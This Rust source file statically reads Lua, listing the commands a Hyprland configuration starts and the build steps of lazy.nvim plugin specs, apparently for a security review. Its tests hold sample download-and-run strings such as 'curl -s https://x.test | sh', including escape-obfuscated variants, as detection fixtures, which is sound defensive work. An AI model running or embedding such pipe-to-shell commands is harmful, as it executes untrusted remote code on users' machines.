//! Reads Lua without running it, for two things.
//!
//! - The commands a Hyprland Lua configuration starts with Hyprland:
//!   string arguments of `exec_on_start`, `launch_on_start`, `exec_cmd`,
//!   `shell_succeeds`, `os.execute` and `io.popen`. Only literal strings are
//!   read (concatenations are joined); anything computed is listed as such.
//!   The whole file still goes to the AI review, so this only explains what
//!   runs; it does not decide anything.
//! - The plugin specs of lazy.nvim (`{ "owner/repo", build = "make" }`):
//!   where each plugin comes from and what it builds, as far as table
//!   literals say it (see `plugin_specs`).

const STARTUP: &[&str] = &[
    "exec_on_start",
    "launch_on_start",
    "exec_cmd",
    "shell_succeeds",
    "execute",
    "popen",
];

/// The commands `text` starts.
pub(super) fn startup_commands(text: &str) -> Vec<String> {
    let tokens = tokenize(text);
    let mut found = Vec::new();
    for (index, token) in tokens.iter().enumerate() {
        let Token::Name(name) = token else {
            continue;
        };
        if !STARTUP.contains(&name.as_str()) || tokens.get(index + 1) != Some(&Token::Open) {
            continue;
        }
        // The first argument: strings joined by `..`, or a nested call such
        // as `o.launch("x")`, whose strings are taken.
        let mut command = String::new();
        let mut computed = false;
        let mut depth = 0_usize;
        for token in &tokens[index + 1..] {
            match token {
                Token::Open => depth += 1,
                Token::Close => {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
                Token::Comma if depth == 1 => break,
                Token::String(text) => command.push_str(text),
                Token::Name(_) => computed = true,
                Token::Comma
                | Token::TableOpen
                | Token::TableClose
                | Token::IndexOpen
                | Token::IndexClose
                | Token::Assign
                | Token::Other => {}
            }
        }
        let command = command.trim();
        if !command.is_empty() {
            found.push(command.to_string());
        } else if computed {
            found.push("(computed)".to_string());
        }
    }
    found
}

/// A plugin spec of lazy.nvim, as far as one table literal says it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(super) struct Spec {
    /// Where lazy.nvim fetches the plugin from: its `url`, or the table's
    /// first entry (`"owner/repo"`, or an address).
    pub(super) source: String,
    /// The plugin's directory name: its `name`, or the last part of
    /// `source` without `.git`.
    pub(super) name: String,
    /// What its `build` key runs: none, one step, or each of a list.
    pub(super) builds: Vec<Build>,
}

/// What a spec's `build` key runs when lazy.nvim installs or updates the
/// plugin.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(super) enum Build {
    /// A Neovim command (`":TSUpdate"`), run inside Neovim.
    Command(String),
    /// A shell command (`"make"`): the whole value is that string.
    Shell(String),
    /// A Lua function or expression, with the strings it may give
    /// (`vim.g.x and "cargo build"` may give `cargo build`): only running
    /// the Lua tells which of them, if any, runs.
    Lua(Vec<String>),
    /// The value of a field whose key code computes (`[("build")] = …`),
    /// with the strings it may give: it may be a build step, and code that
    /// was not read decides, so it counts as one that runs a command.
    Computed(Vec<String>),
}

/// The plugin specs in `text`: every table literal whose first entry is a
/// plugin's source (`"owner/repo"` or an address) or that has a `url` key,
/// at any depth, so `dependencies = { "a/b" }` counts as well. Only
/// literals are read: a spec built by code, or a bare string that is not
/// in a table (`dependencies = "a/b"`), is not found.
///
/// A key (`build = …` or `["build"] = …`) counts only as a field of the
/// innermost table: right after its `{` or a separator, and outside any
/// function body or block within it, so `opts.name = "x"` or
/// `local build = "make"` in a `config` function sets nothing. A key that
/// code computes (`[("build")] = …`) may be any of them, so its value is
/// taken as a build step that is not read (`Build::Computed`).
pub(super) fn plugin_specs(text: &str) -> Vec<Spec> {
    let tokens = tokenize(text);
    let mut specs = Vec::new();
    let mut tables: Vec<Table> = Vec::new();
    for (index, token) in tokens.iter().enumerate() {
        match token {
            Token::TableOpen => tables.push(Table::opened(&tokens[index + 1..])),
            Token::TableClose => specs.extend(tables.pop().and_then(Table::spec)),
            _ => {
                let Some(table) = tables.last_mut() else {
                    continue;
                };
                if table.blocks == 0 {
                    match field(&tokens, index) {
                        Some((Key::Named(key), value)) => table.set(key, value),
                        Some((Key::Computed, value)) => table.builds.push(computed(value)),
                        None => {}
                    }
                }
                table.blocks = table.blocks.saturating_add_signed(nesting(token));
            }
        }
    }
    specs
}

/// The key of a table field.
#[derive(Debug)]
enum Key<'a> {
    /// `key = …` or `["key"] = …`.
    Named(&'a str),
    /// `[<code>] = …`: what key it is, only running the code tells.
    Computed,
}

/// The key of the table field that starts at `tokens[index]`, and the
/// tokens from its value on, right after a `{` or a separator.
fn field(tokens: &[Token], index: usize) -> Option<(Key<'_>, &[Token])> {
    let before = tokens.get(index.checked_sub(1)?)?;
    if !matches!(before, Token::TableOpen | Token::Comma) {
        return None;
    }
    match &tokens[index..] {
        [Token::Name(key), Token::Assign, ..] => Some((Key::Named(key), &tokens[index + 2..])),
        [
            Token::IndexOpen,
            Token::String(key),
            Token::IndexClose,
            Token::Assign,
            ..,
        ] => Some((Key::Named(key), &tokens[index + 4..])),
        [Token::IndexOpen, ..] => Some((Key::Computed, bracketed_value(tokens, index)?)),
        _ => None,
    }
}

/// The tokens from the value on of the `[<key>] = …` field whose `[` is
/// `tokens[index]`; `None` when no `=` follows its `]`.
fn bracketed_value(tokens: &[Token], index: usize) -> Option<&[Token]> {
    let mut depth = 0_usize;
    for (at, token) in tokens.iter().enumerate().skip(index) {
        match token {
            Token::IndexOpen => depth += 1,
            Token::IndexClose if depth == 1 => {
                return (tokens.get(at + 1) == Some(&Token::Assign)).then(|| &tokens[at + 2..]);
            }
            Token::IndexClose => depth = depth.saturating_sub(1),
            _ => {}
        }
    }
    None
}

/// The value starting at `value` of a field whose key code computes, as a
/// build step that is not read, with the strings it may run.
fn computed(value: &[Token]) -> Build {
    let strings = match build(value) {
        Some(Build::Command(text) | Build::Shell(text)) => vec![text],
        Some(Build::Lua(strings) | Build::Computed(strings)) => strings,
        None => Vec::new(),
    };
    Build::Computed(strings)
}

/// How `token` changes how deep in blocks and brackets the code is, table
/// braces aside: `function`, `do`, `if`, `repeat`, `(` and `[` open one;
/// `end`, `until`, `)` and `]` close one.
fn nesting(token: &Token) -> isize {
    match token {
        Token::Open | Token::IndexOpen => 1,
        Token::Close | Token::IndexClose => -1,
        Token::Name(word) => match word.as_str() {
            "function" | "do" | "if" | "repeat" => 1,
            "end" | "until" => -1,
            _ => 0,
        },
        Token::String(_)
        | Token::TableOpen
        | Token::TableClose
        | Token::Assign
        | Token::Comma
        | Token::Other => 0,
    }
}

/// What one table literal says so far.
#[derive(Debug, Default)]
struct Table {
    first: Option<String>,
    url: Option<String>,
    name: Option<String>,
    builds: Vec<Build>,
    /// How deep in blocks and brackets (see `nesting`) the tokens read so
    /// far leave it.
    blocks: usize,
}

impl Table {
    /// A table whose entries are `after`, the tokens after its `{`.
    fn opened(after: &[Token]) -> Self {
        let first = match after {
            [Token::String(first), Token::Comma | Token::TableClose, ..] => Some(first.clone()),
            _ => None,
        };
        Self {
            first,
            ..Self::default()
        }
    }

    /// Takes in key `key`, whose value starts at `value`.
    fn set(&mut self, key: &str, value: &[Token]) {
        let text = match value.first() {
            Some(Token::String(text)) => Some(text.clone()),
            _ => None,
        };
        match key {
            "url" => self.url = text,
            "name" => self.name = text,
            // Every build key counts: a second one may be what runs.
            "build" => self.builds.extend(builds(value)),
            _ => {}
        }
    }

    fn spec(self) -> Option<Spec> {
        let source = self.url.or(self.first.filter(|first| is_source(first)))?;
        let name = self.name.unwrap_or_else(|| {
            let last = source.trim_end_matches('/').rsplit(['/', ':']).next();
            let last = last.unwrap_or(&source);
            last.strip_suffix(".git").unwrap_or(last).to_string()
        });
        Some(Spec {
            source,
            name,
            builds: self.builds,
        })
    }
}

/// Whether `text` names where a plugin comes from the way lazy.nvim takes a
/// spec's first entry: `owner/repo`, or an address.
fn is_source(text: &str) -> bool {
    let plain = |part: &str| {
        !part.is_empty()
            && !part.starts_with('.')
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
    };
    let repo = text
        .split_once('/')
        .is_some_and(|(owner, repo)| plain(owner) && plain(repo));
    repo || text.contains("://") || text.starts_with("git@")
}

/// What the value of a `build` key, starting at `value`, runs: a list
/// (`{ "make", ":TSUpdate" }`) runs each of its entries.
fn builds(value: &[Token]) -> Vec<Build> {
    if value.first() != Some(&Token::TableOpen) {
        return build(value).into_iter().collect();
    }
    let mut builds = Vec::new();
    let mut depth = 0_isize;
    let mut entry = true;
    for (index, token) in value.iter().enumerate().skip(1) {
        if entry && depth == 0 && *token != Token::TableClose {
            // `[2] = "x"` is a list entry too, whatever its index says: a
            // literal one is that step, anything else is not read.
            let entry = match field(value, index) {
                Some((Key::Named(_), _)) => None,
                Some((Key::Computed, value)) => match build(value) {
                    Some(step @ (Build::Shell(_) | Build::Command(_))) => Some(step),
                    Some(Build::Lua(_) | Build::Computed(_)) | None => Some(computed(value)),
                },
                None => build(&value[index..]),
            };
            builds.extend(entry);
        }
        entry = false;
        match token {
            Token::TableClose if depth == 0 => break,
            Token::Comma if depth == 0 => entry = true,
            Token::TableOpen => depth += 1,
            Token::TableClose => depth -= 1,
            Token::Name(_)
            | Token::String(_)
            | Token::Open
            | Token::Close
            | Token::IndexOpen
            | Token::IndexClose
            | Token::Assign
            | Token::Comma
            | Token::Other => depth += nesting(token),
        }
    }
    builds
}

/// What one build step, starting at `value`, runs; `None` for `false` and
/// `nil`, which turn a build off.
fn build(value: &[Token]) -> Option<Build> {
    match value {
        [Token::Name(word)] | [Token::Name(word), Token::Comma | Token::TableClose, ..]
            if matches!(word.as_str(), "false" | "nil") =>
        {
            return None;
        }
        _ => {}
    }
    if let Some(text) = literal(value) {
        return Some(if text.starts_with(':') {
            Build::Command(text)
        } else {
            Build::Shell(text)
        });
    }
    let mut strings = Vec::new();
    let mut depth = 0_usize;
    let mut body = 0_isize;
    for token in value {
        // A function's strings are its code's, not what it gives; what
        // follows its `end` is the expression's again.
        if body > 0 || matches!(token, Token::Name(word) if word == "function") {
            body += nesting(token);
            continue;
        }
        match token {
            Token::Open | Token::TableOpen => depth += 1,
            Token::Close | Token::TableClose | Token::Comma if depth == 0 => break,
            Token::Close | Token::TableClose => depth -= 1,
            Token::String(text) => strings.push(text.clone()),
            _ => {}
        }
    }
    Some(Build::Lua(strings))
}

/// The string the value starting at `value` is, up to its end, when it is
/// nothing but strings and parentheses: `"make"`, `("make")` or
/// `"a" .. "b"` (`..` is no token). `None` for anything computed.
fn literal(value: &[Token]) -> Option<String> {
    let mut text = String::new();
    let mut strings = 0_usize;
    let mut depth = 0_usize;
    for token in value {
        match token {
            Token::String(part) => {
                text.push_str(part);
                strings += 1;
            }
            Token::Open => depth += 1,
            Token::Close if depth > 0 => depth -= 1,
            Token::Comma | Token::TableClose | Token::Close if depth == 0 => break,
            _ => return None,
        }
    }
    (strings > 0).then_some(text)
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Token {
    Name(String),
    String(String),
    Open,
    Close,
    /// `{`
    TableOpen,
    /// `}`
    TableClose,
    /// `[` that opens no long string.
    IndexOpen,
    /// `]`
    IndexClose,
    /// A lone `=`; `==`, `~=`, `<=` and `>=` are `Other`.
    Assign,
    Comma,
    Other,
}

/// Names, strings and brackets, with comments and long strings handled.
fn tokenize(text: &str) -> Vec<Token> {
    let chars: Vec<char> = text.chars().collect();
    let mut tokens = Vec::new();
    let mut index = 0;
    while index < chars.len() {
        let character = chars[index];
        if character == '-' && chars.get(index + 1) == Some(&'-') {
            index += 2;
            if let Some((_, end)) = long_bracket(&chars, index) {
                index = end;
            } else {
                while index < chars.len() && chars[index] != '\n' {
                    index += 1;
                }
            }
            continue;
        }
        if let Some((content, end)) = long_bracket(&chars, index) {
            tokens.push(Token::String(content));
            index = end;
            continue;
        }
        if character == '"' || character == '\'' {
            let (value, end) = short_string(&chars, index);
            tokens.push(Token::String(value));
            index = end;
            continue;
        }
        if character.is_alphabetic() || character == '_' {
            let start = index;
            while index < chars.len() && (chars[index].is_alphanumeric() || chars[index] == '_') {
                index += 1;
            }
            tokens.push(Token::Name(chars[start..index].iter().collect()));
            continue;
        }
        if matches!(character, '=' | '~' | '<' | '>') {
            let start = index;
            while index < chars.len() && matches!(chars[index], '=' | '~' | '<' | '>') {
                index += 1;
            }
            tokens.push(if index - start == 1 && character == '=' {
                Token::Assign
            } else {
                Token::Other
            });
            continue;
        }
        tokens.push(match character {
            '(' => Token::Open,
            ')' => Token::Close,
            '{' => Token::TableOpen,
            '}' => Token::TableClose,
            '[' => Token::IndexOpen,
            ']' => Token::IndexClose,
            // Lua separates table fields with either.
            ',' | ';' => Token::Comma,
            _ if character.is_whitespace() || character == '.' => {
                index += 1;
                continue;
            }
            _ => Token::Other,
        });
        index += 1;
    }
    tokens
}

/// The quoted string starting at `start` (its quote): its value, with
/// escapes decoded as Lua decodes them, and the index after it.
fn short_string(chars: &[char], start: usize) -> (String, usize) {
    let quote = chars[start];
    let mut value = String::new();
    let mut index = start + 1;
    while index < chars.len() && chars[index] != quote && chars[index] != '\n' {
        if chars[index] == '\\' && index + 1 < chars.len() {
            index = escape(chars, index + 1, &mut value);
        } else {
            value.push(chars[index]);
            index += 1;
        }
    }
    (value, index + 1)
}

/// Decodes the escape whose first character after the backslash is at
/// `start` into `value`, and returns the index after it: `\ddd` (decimal),
/// `\xXX`, `\u{XXX}`, `\z` (skips the blanks after it) and the one-letter
/// ones.
fn escape(chars: &[char], start: usize, value: &mut String) -> usize {
    let digits = |from: usize, radix: u32, most: usize| {
        let end = (from..chars.len().min(from + most))
            .find(|&at| !chars[at].is_digit(radix))
            .unwrap_or(chars.len().min(from + most));
        let text: String = chars[from..end].iter().collect();
        (u32::from_str_radix(&text, radix).ok(), end)
    };
    let (decoded, end) = match chars[start] {
        'n' => (Some('\n'), start + 1),
        't' => (Some('\t'), start + 1),
        'r' => (Some('\r'), start + 1),
        'a' => (Some('\u{7}'), start + 1),
        'b' => (Some('\u{8}'), start + 1),
        'f' => (Some('\u{c}'), start + 1),
        'v' => (Some('\u{b}'), start + 1),
        'z' => {
            let end = (start + 1..chars.len())
                .find(|&at| !chars[at].is_whitespace())
                .unwrap_or(chars.len());
            (None, end)
        }
        'x' => {
            let (code, end) = digits(start + 1, 16, 2);
            (code.and_then(char::from_u32), end)
        }
        'u' if chars.get(start + 1) == Some(&'{') => {
            let (code, end) = digits(start + 2, 16, 8);
            let end = if chars.get(end) == Some(&'}') {
                end + 1
            } else {
                end
            };
            (code.and_then(char::from_u32), end)
        }
        digit if digit.is_ascii_digit() => {
            let (code, end) = digits(start, 10, 3);
            (code.and_then(char::from_u32), end)
        }
        other => (Some(other), start + 1),
    };
    value.extend(decoded);
    end
}

/// A long bracket (`[[…]]`, `[==[…]==]`) starting at `start`: its content
/// and the index after it. An unclosed one runs to the end.
fn long_bracket(chars: &[char], start: usize) -> Option<(String, usize)> {
    if chars.get(start) != Some(&'[') {
        return None;
    }
    let mut level = 0;
    let mut index = start + 1;
    while chars.get(index) == Some(&'=') {
        level += 1;
        index += 1;
    }
    if chars.get(index) != Some(&'[') {
        return None;
    }
    let close: Vec<char> = std::iter::once(']')
        .chain(std::iter::repeat_n('=', level))
        .chain(std::iter::once(']'))
        .collect();
    let content = index + 1;
    let mut index = content;
    while index + close.len() <= chars.len() {
        if chars[index..index + close.len()] == close[..] {
            return Some((chars[content..index].iter().collect(), index + close.len()));
        }
        index += 1;
    }
    Some((
        chars[content.min(chars.len())..].iter().collect(),
        chars.len(),
    ))
}

#[cfg(test)]
mod tests {
    use super::{Build, Spec, plugin_specs, startup_commands};

    #[test]
    fn startup_calls_are_found_and_comments_ignored() {
        let text = r#"
local o = require("omarchy")
-- o.exec_on_start("commented")
--[[ o.exec_on_start("block comment") ]]
o.exec_on_start("waybar")
o.launch_on_start("hyprsunset")
o.exec_on_start(o.launch("mako"))
o.exec_on_start("swaybg -i " .. "~/bg.png")
o.exec_on_start(command_from_somewhere)
os.execute("curl -s https://x.test | sh")
local f = io.popen('id')
o.exec_on_start([[long one]])
o.bind("SUPER, Return", "Terminal", o.launch("alacritty"))
"#;
        assert_eq!(
            startup_commands(text),
            [
                "waybar",
                "hyprsunset",
                "mako",
                "swaybg -i ~/bg.png",
                "(computed)",
                "curl -s https://x.test | sh",
                "id",
                "long one"
            ]
        );
    }

    #[test]
    fn plugin_specs_are_read_from_table_literals() {
        let text = r#"
local lazyrepo = "https://github.com/folke/lazy.nvim.git"
return {
  -- { "commented/out" },
  { "folke/snacks.nvim", opts = { enabled = x == "a/b" } },
  {
    "bjarneo/aether.nvim",
    name = "aether",
    dependencies = { "nvim-lua/plenary.nvim", "MunifTanjim/nui.nvim" },
    build = ":TSUpdate",
  },
  { url = "https://gitlab.com/o/r.git", build = vim.g.x and "cargo build" or "make" },
  { "a/fn", build = function() local a, b = 1, 2 os.execute("x") end, name = "fn2" },
  { "a/off", build = false },
  { "a/make", build = "make" },
  { "BufReadPost", "BufNewFile" },
  { import = "plugins" },
}
"#;
        let spec = |source: &str, name: &str, build: Option<Build>| Spec {
            source: source.into(),
            name: name.into(),
            builds: build.into_iter().collect(),
        };
        assert_eq!(
            plugin_specs(text),
            [
                spec("folke/snacks.nvim", "snacks.nvim", None),
                spec("nvim-lua/plenary.nvim", "plenary.nvim", None),
                spec(
                    "bjarneo/aether.nvim",
                    "aether",
                    Some(Build::Command(":TSUpdate".into()))
                ),
                spec(
                    "https://gitlab.com/o/r.git",
                    "r",
                    Some(Build::Lua(vec!["cargo build".into(), "make".into()]))
                ),
                spec("a/fn", "fn2", Some(Build::Lua(Vec::new()))),
                spec("a/off", "off", None),
                spec("a/make", "make", Some(Build::Shell("make".into()))),
            ]
        );
    }

    #[test]
    fn keys_in_code_within_a_spec_are_no_fields_of_it() {
        let text = r#"
return {
  {
    "a/b",
    config = function()
      local build = "make"
      opts.name = "x"
      local t = {}; build = "curl x | sh"
      if y then name = "z" end
    end,
  },
}
"#;
        let specs = plugin_specs(text);
        assert_eq!(specs.len(), 1);
        assert_eq!(specs[0].name, "b");
        assert_eq!(specs[0].builds, []);
    }

    #[test]
    fn a_build_list_gives_each_step_and_semicolons_separate_fields() {
        let text =
            r#"{ "a/b"; build = { "make", ":TSUpdate", function() local a, b = 1, 2 end } }"#;
        assert_eq!(
            plugin_specs(text)[0].builds,
            [
                Build::Shell("make".into()),
                Build::Command(":TSUpdate".into()),
                Build::Lua(Vec::new()),
            ]
        );
    }

    #[test]
    fn a_literal_build_is_a_shell_step_however_it_is_written() {
        let builds = |text: &str| plugin_specs(text)[0].builds.clone();
        let shell = |text: &str| vec![Build::Shell(text.into())];
        assert_eq!(builds(r#"{ "a/b", ["build"] = "make" }"#), shell("make"));
        assert_eq!(
            builds(r#"{ "a/b", build = ("curl x | sh") }"#),
            shell("curl x | sh")
        );
        assert_eq!(
            builds(r#"{ "a/b", build = "curl x" .. " | sh" }"#),
            shell("curl x | sh")
        );
        assert_eq!(
            builds(r#"{ "a/b", build = (":TS" .. "Update") }"#),
            [Build::Command(":TSUpdate".into())]
        );
        // A string after a function is still one the expression may give.
        assert_eq!(
            builds(r#"{ "a/b", build = c and function() return "no" end or "curl|sh" }"#),
            [Build::Lua(vec!["curl|sh".into()])]
        );
        // Anything computed stays Lua.
        assert_eq!(
            builds(r#"{ "a/b", build = "make " .. target }"#),
            [Build::Lua(vec!["make ".into()])]
        );
        // Escapes are decoded as Lua decodes them.
        assert_eq!(builds(r#"{ "a/b", ["\98uild"] = "make" }"#), shell("make"));
        assert_eq!(
            builds(
                r#"{ "a/b", build = "\99url\x20x|\z
                sh\u{21}" }"#
            ),
            shell("curl x|sh!")
        );
        // A key code computes may be `build`: its value is kept, unread.
        let computed = |text: &str| vec![Build::Computed(vec![text.into()])];
        assert_eq!(
            builds(r#"{ "a/b", [("build")] = "make" }"#),
            computed("make")
        );
        assert_eq!(
            builds(r#"{ "a/b", ["bu".."ild"] = "make" }"#),
            computed("make")
        );
        assert_eq!(
            builds(r#"{ "a/b", build = { "make", [2] = "curl|sh" } }"#),
            [Build::Shell("make".into()), Build::Shell("curl|sh".into())]
        );
        // A bracketed entry whose value is computed is not read.
        assert_eq!(
            builds(r#"{ "a/b", build = { [k] = c and "x" } }"#),
            computed("x")
        );
    }

    #[test]
    fn broken_lua_gives_what_it_can_and_no_panic() {
        for text in [
            "{ \"a/b\", build = ",
            "}}}{ \"a/b\"",
            "{ [[a/b",
            "{ \"a/b\" ,",
            "{ \"a/b\", build = \"\\",
            "{ \"a/b\", build = \"\\u{",
            "{ \"a/b\", build = \"\\u{ffffffffff}\\x\\999\\z",
            "{ \"a/b\", [[[\"build\"] = 1",
            "{ \"a/b\", [",
        ] {
            drop(plugin_specs(text));
        }
        assert_eq!(plugin_specs("{ \"a/b\" }")[0].name, "b");
    }
}
